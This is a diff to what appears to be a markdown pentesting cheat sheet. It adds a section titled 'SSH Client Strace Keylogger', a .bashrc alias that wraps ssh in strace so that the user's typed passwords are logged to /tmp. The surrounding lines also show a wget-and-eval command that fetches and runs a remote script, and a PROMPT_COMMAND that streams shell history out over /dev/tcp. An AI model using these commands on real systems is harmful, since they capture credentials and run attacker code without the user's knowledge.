@@ -39,6 +39,18 @@ bash -c CMD="`wget -qO- http://<ip>/script.sh`" && eval "$CMD"
 PROMPT_COMMAND='history -a; tail -n1 ~/.bash_history > /dev/tcp/127.0.0.1/9000'
 ```
 
+### SSH Client Strace Keylogger
+
+* Poor mans keylogger for ssh client but it works. Add to the users `.bashrc`&#x20;
+
+```
+alias ssh='strace   -o   /tmp/sshpwd-`date    '+%d%h%m%s'`.log  \
+ -e read,write,connect  -s2048 ssh' 
+```
+
+* remember to source the `.bashrc`
+* `source ~/.bashrc`
+
 ### Apache map external drive to webroot
 
 * Create a directory on the external HDD, assuming it is mounted under the `/media` directory, like so:
